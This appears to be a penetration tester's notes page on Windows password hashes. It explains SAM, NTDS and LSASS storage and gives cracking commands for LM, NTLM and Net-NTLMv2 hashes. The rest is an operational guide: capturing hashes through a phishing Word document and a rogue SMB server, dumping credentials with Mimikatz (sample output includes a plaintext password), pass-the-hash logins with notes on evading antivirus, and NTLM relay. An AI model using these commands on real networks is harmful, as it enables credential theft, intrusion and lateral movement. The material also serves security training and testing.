---
layout: page
title: Windows
permalink: /windows/
---

# Index

* [Password Overview](#password-overview)
* [Hashes](#hashes)

## Password Overview

When a local user account is created the password is stored in the Security Accounts Manager (SAM) database.

When an AD account is created the password is stored in Ntds.dit, the main AD Database. The password hashes are encrypted using a key
stored in the SYSTEM registry hive.

When a user logs into a Windows machine their password is stored in the Local Security Authority Subsystem Service (LSASS) as a NTLM hash. LSASS loads the SAM service into it's process. Then when a user tries to access a network resource (for example a smb share)
they are issued a challenge, LSASS responds with a challenge + response which the network resource then confirms
as correct with the domain controller. This challenge response protocol is called NetNTLMv1/2.

*LM*: LM-hashes are the oldest password storage used by Windows. Turned of by default in Windows Vista/Server 2008. Very weak.
Example
```
299BD128C1101FD6
```
Cracking
```
john --format=lm hash.txt
hashcat -m 3000 -a 3 hash.txt
```

*NTLM*: How passwords are stored on modern Windows, can be retireved from the SAM. Sometimes called NTHash or NTLM hash. These are a variant on MD4.
Example
```
B4B9B02E6F09A9BD760F388B67351E2B
```
Cracking
```
john --format=nt hash.txt
hashcat -m 1000 -a 3 hash.txt
```

*Net-NTLMv2*: The challenge response authentication protocol using NTLM.
Example
```
admin::N46iSNekpT:08ca45b7d7ea58ee:88dcbe4446168966a153a0064958dac6:5c7830315c7830310000000000000b45c67103d07d7b95acd12ffa11230e0000000052920b85f78d013c31cdb3b92f5d765c783030
```
Cracking
```
john --format=netntlmv2 hash.txt
hashcat -m 5600 -a 3 hash.txt
```

## Hashes

### Acquiring Remotely

Essentially we need the user to attempt to attempt to connect to a network resource we control, as the users computer will attempt the Challenge Response Authentication and in doing so send us their NetNTLMv1/2 hash. This can be achieve through social engineering/phishing. For example the Word UNC Injector metasploit module will create a word document that when opened will try to connect to a smb share we are hosting.

```
use auxiliary/docx/word_unc_injector
```


### Acquiring from non privileged account

A non privileged account can't access the SAM file to see the hashes, but it can make a connection to a SMB server we control and in doing so send us its NetNTLMv1/2 hash.

A useful tool for this is Impacket's smbserver.py. There is a metasploit module too.

```
# impacket-smbserver test smb/
...
[*] Incoming connection (192.168.199.227,49159)                   
[*] AUTHENTICATE_MESSAGE (IEWIN7\IEUser,IEWIN7)                   
[*] User IEUser\IEWIN7 authenticated successfully                 
[*] IEUser::IEWIN7:4141414141414141:3398e72b4769bc7ce2c2ff74ae035fb5:010100000000000000f20b88d6c7d4015435bb9f50dedce2000000000100100052006300510050005600580062004a00020010004c0054005600450059005900790048000300100052006300510050005600580062004a00040010004c0054005600450059005900790048000700080000f20b88d6c7d40106000400020000000800300030000000000000000000000000300000c85fc1b5dc7f1c43ed2cc0285dec3b7569075b9adc80bfb81ceffb714e3715630a001000000000000000000000000000000000000900280063006900660073002f003100390032002e003100360038002e003100390039002e00320031003900000000000000000000000000
```

### Acquiring from a privileged account

The most popular way of acquiring NTLM hashes once we have a privileged account is using Mimikatz. Mimikatz requires an account with *debug* privileges, esentially Local Administrators.

Mimikatz comes in x32 and x64 variants, the correct version must be used for the computer we are dumping hashes from. Mimikatz can also get plaintext passwords from wdigest if they are available (a SSO protocol used up to and in W7 mainly for HTTP auth).

Mimikatz should be runas administrator.

Once opened you need to set the debug privilege
```
# privilege::debug
```
Then dump the passwords
```
# sekurlsa::logonpasswords
...
msv :
 [00010000] CredentialKeys
 * NTLM     : fc525c9683e8fe067095ba2ddc971889
 * SHA1     : e53d7244aa8727f5789b01d8959141960aad5d22
 [00000003] Primary
 * Username : IEUser
 * Domain   : IEWIN7
 * NTLM     : fc525c9683e8fe067095ba2ddc971889
 * SHA1     : e53d7244aa8727f5789b01d8959141960aad5d22
tspkg :
wdigest :
 * Username : IEUser
 * Domain   : IEWIN7
 * Password : Passw0rd!
kerberos :
 * Username : IEUser
 * Domain   : IEWIN7
 * Password : (null)
ssp :
credman :
```

### Passing the Hash

Once we have the NTLM hash for an account we can use it to log into other machines it has access to. This can be done with a few tools.
All of these can use plaintext passwords too.

These three drop a binary
```
/exploit/windows/smb/psexec
```
```
winexe -U IEuser/Passw0rd! //192.168.199.227 cmd.exe
```
```
psexec.py IEUser:Passw0rd\!@192.168.199.227
```
This one doesn't drop a binary but creates a service every time it runs. More likely to evade AV detection.
```
smbexec.py IEUser:Passw0rd\!@192.168.199.227
```
This one is the stealthiest, as it uses Window's own management tools.
```
wmiexec.py IEUser:Passw0rd\!@192.168.199.227
```

### Relay Attacks

NetNTLMv1/2 can not be used to Pass the Hash, but they can be used in Relay attacks.

Reflection attacks (where the NetNTLMv1/2 hash is passed back to machine which generated it) have been patched as of MS08-68.

However the NetNTLMv1/2 can be used against other hosts in what is known as a relay attack. Note this requires SMB signing to be disabled. Basically we use Responder to intercept legitimate NetNTLMv1/2 challenge requests, and play man in the middle with ntlmrelayx.py from Impacket. This gets us an authenticated sessions as whoever was trying to access the restricted resource.

A good walkthrough is here

https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html
